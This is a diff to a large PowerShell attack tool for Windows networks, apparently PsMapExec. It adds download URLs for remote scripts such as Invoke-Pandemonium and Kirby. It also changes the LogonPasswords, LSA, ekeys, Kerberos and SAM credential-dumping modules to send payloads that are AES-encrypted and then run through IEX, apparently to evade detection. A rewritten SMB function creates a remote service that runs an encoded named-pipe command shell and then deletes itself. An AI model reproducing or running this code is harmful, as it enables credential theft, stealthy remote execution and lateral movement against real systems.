@@ -736,6 +736,9 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
 
     #$PandemoniumURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1"
     $NTDSURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-NTDS.ps1"
+    $PandemoniumURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1"
+    $KirbyURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Kirby.ps1"
+
 
     # Fix later, needs to be coded into Amnesiac logic portion
     $Amn3s1acURL = "https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1"
@@ -2124,6 +2127,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
 
     # LogonPasswords
     elseif ($Module -eq "LogonPasswords") {
+        
         $key = Generate-RandomString 32
         $iv = Generate-RandomString 16  
         $n = AESEnc -k $key -iv $iv -t "$Pandemonium"
@@ -2132,33 +2136,42 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
 
     # eKeys
     elseif ($Module -eq "ekeys") {
+        
         $key = Generate-RandomString 32
         $iv = Generate-RandomString 16  
         $n = AESEnc -k $key -iv $iv -t "$Pandemonium"
         $Command = "$Arbiter ; $Decrypt ;  AESDec $key $iv $n | IEX ; Invoke-Pandemonium -command ""ekeys"""
+        
     }
 
     # LSA
     elseif ($Module -eq "LSA") {
+
         $key = Generate-RandomString 32
         $iv = Generate-RandomString 16  
         $n = AESEnc -k $key -iv $iv -t "$Pandemonium"
         $Command = "$Arbiter ; $Decrypt ;  AESDec $key $iv $n | IEX ; Invoke-Pandemonium -command ""lsa"""
+        
     }
 
     # KerbDump
     elseif ($Module -eq "KerbDump") {
+
         $key = Generate-RandomString 32
         $iv = Generate-RandomString 16  
         $n = AESEnc -k $key -iv $iv -t "$LocalKirbDump"
-        $Command = "$Arbiter ; $Decrypt ;  AESDec $key $iv $n | IEX "
+        $Command = "$Arbiter ; $Decrypt ;  AESDec $key $iv $n | IEX"
+
+        
     }
 
     # SAM
     elseif ($Module -eq "sam") {
-        $b64 = "$LocalSAM"
-        $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
-        $Command = "powershell.exe -ep bypass -enc $base64command"
+        
+        $key = Generate-RandomString 32
+        $iv = Generate-RandomString 16  
+        $n = AESEnc -k $key -iv $iv -t "$LocalSAM"
+        $Command = "$Arbiter ; $Decrypt ;  AESDec $key $iv $n | IEX"
     }
 
     # Disks
@@ -2203,8 +2216,11 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
     }
 
     elseif ($Module -eq "" -and $Command -ne "") {
-        $base64Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
-        $Command = "powershell.exe -ep bypass -enc $base64Command"
+        
+        $key = Generate-RandomString 32
+        $iv = Generate-RandomString 16  
+        $n = AESEnc -k $key -iv $iv -t "$Command"
+        $Command = "$Decrypt ;  AESDec $key $iv $n | IEX"
     }
 
     ################################################################################################################
@@ -2583,19 +2599,20 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
             }
 
     
-            function Enter-SMBSession {
-
+            function Invoke-SMBRemoting {
+	
                 param (
                     [string]$PipeName,
                     [string]$ComputerName,
                     [string]$ServiceName,
                     [string]$Command,
-                    [string]$Timeout = "45000"
+                    [string]$Timeout = "60000",
+                    [switch]$Verbose
                 )
 	
                 $ErrorActionPreference = "SilentlyContinue"
                 $WarningPreference = "SilentlyContinue"
-	
+                Set-Variable MaximumHistoryCount 32767
 	
                 if (-not $ComputerName) {
                     Write-Output " [-] Please specify a Target"
@@ -2615,8 +2632,12 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                 }
 	
                 $ServerScript = @"
-`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 1028, 1028, `$null)
+`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null)
+`$tcb={param(`$state);`$state.Close()};
+`$tm = New-Object System.Threading.Timer(`$tcb, `$pipeServer, 600000, [System.Threading.Timeout]::Infinite);
 `$pipeServer.WaitForConnection()
+`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);
+`$tm.Dispose();
 `$sr = New-Object System.IO.StreamReader(`$pipeServer)
 `$sw = New-Object System.IO.StreamWriter(`$pipeServer)
 while (`$true) {
@@ -2627,7 +2648,7 @@ while (`$true) {
 	if (`$command -eq "exit") {break} 
 	else {
 		try{
-			`$result =  `$command | IEX  | Out-String
+			`$result = Invoke-Expression `$command | Out-String
 			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
 		} catch {
 			`$errorMessage = `$_.Exception.Message
@@ -2642,12 +2663,26 @@ while (`$true) {
 "@
 	
                 $B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
+	
                 $arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
+	
                 $startarguments = "\\$ComputerName start $ServiceName"
 	
                 Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
-                Start-Sleep -Milliseconds 2000
+	
+                Start-Sleep -Milliseconds 1000
+	
                 Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
+	
+                if ($Verbose) {
+                    Write-Output ""
+                    Write-Output " [+] Pipe Name: $PipeName"
+                    Write-Output ""
+                    Write-Output " [+] Service Name: $ServiceName"
+                    Write-Output ""
+                    Write-Output " [+] Creating Service on Remote Target..."
+                }
+                #Write-Output ""
 	
                 # Get the current process ID
                 $currentPID = $PID
@@ -2698,35 +2733,31 @@ while (`$true) {
 
                 $serverOutput = ""
 	
-                try {
-                    if ($Command) {
-                        $fullCommand = "$Command 2>&1 | Out-String"
-                        $sw.WriteLine($fullCommand)
-                        $sw.Flush()
-                        while ($true) {
-                            $line = $sr.ReadLine()
-                            if ($line -eq "###END###") {
-                                Write-Output $serverOutput.Trim()
-                                Write-Output ""
-                                return
-                            }
-                            else {
-                                $serverOutput += "$line`n"
-                            }
-                        }
-                    } 
-		
-                }
+        
+                $Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
+                $fullCommand = "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(""$Command"")) | IEX"
+                $sw.WriteLine($fullCommand)
+                $sw.Flush()
+                while ($true) {
+                    $line = $sr.ReadLine()
+                    if ($line -eq "###END###") {
+                        Write-Output $serverOutput.Trim()
+                        Write-Output ""
+                        return
+                    }
+                    else {
+                        $serverOutput += "$line`n"
+                    }
+                } 
 	
-                finally {
-                    $stoparguments = "\\$ComputerName delete $ServiceName"
-                    Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
-                    if ($sw) { $sw.Close() }
-                    if ($sr) { $sr.Close() }
-                }
 	
+
+                $stoparguments = "\\$ComputerName delete $ServiceName"
+                Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
+                $pipeClient.Close()
+                $pipeClient.Dispose()
             }
-            return Enter-SMBSession -ComputerName $ComputerName -Command $Command
+            return Invoke-SMBRemoting -ComputerName $ComputerName -Command $Command
         }
 
         # Create and invoke runspaces for each computer
